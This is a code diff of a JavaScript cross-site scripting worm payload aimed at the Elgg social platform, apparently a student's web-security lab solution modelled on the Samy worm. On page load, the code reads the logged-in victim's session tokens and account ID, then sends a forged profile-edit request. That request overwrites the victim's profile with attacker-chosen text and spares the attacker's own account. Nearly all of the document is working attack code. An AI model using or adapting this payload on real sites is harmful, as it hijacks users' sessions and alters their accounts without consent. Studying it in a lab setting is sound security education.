@@ -2,7 +2,7 @@
     window.onload = function() {
         var ts = elgg.security.token.__elgg_ts;
         var token = elgg.security.token.__elgg_token;
-        var name = elgg.session.user.name;
+        var userName = elgg.session.user.name;
         var guid = elgg.session.user.guid;
 
         var sendurl = "/action/profile/edit";
@@ -14,7 +14,7 @@
         var formData = new FormData();
         formData.append('__elgg_token', token);
         formData.append('__elgg_ts', ts);
-        formData.append('name', "Kim Jong Un");
+        formData.append('name', userName);
         formData.append('description', '1905001');
         formData.append('accesslevel[description]', '1');
         formData.append('briefdescription', 'I am Samy, the worm. Catch me if you can.');
@@ -52,7 +52,7 @@
 	    var userName=elgg.session.user.name;
 	    var guid=elgg.session.user.guid;
         var sendurl='/action/profile/edit';
-	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=Kim Jong Un&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
+	    var content=`__elgg_token=${token}&__elgg_ts=${ts}&name=${userName}&description=1905001&accesslevel[description]=1&briefdescription=I am Samy, the worm. Catch me if you can.&accesslevel[briefdescription]=1&location=Moscow&accesslevel[location]=1&interests=Hacking&accesslevel[interests]=1&skills=Cyber Security&accesslevel[skills]=1&contactemail=abc@yahoo.com&accesslevel[contactemail]=1&phone=9786546&accesslevel[phone]=1&mobile=01234567898&accesslevel[mobile]=1&website=www.clickme.com&accesslevel[website]=1&twitter=elonmusk&accesslevel[twitter]=1&guid=${guid}`;
         
         if(guid != 59)
         {
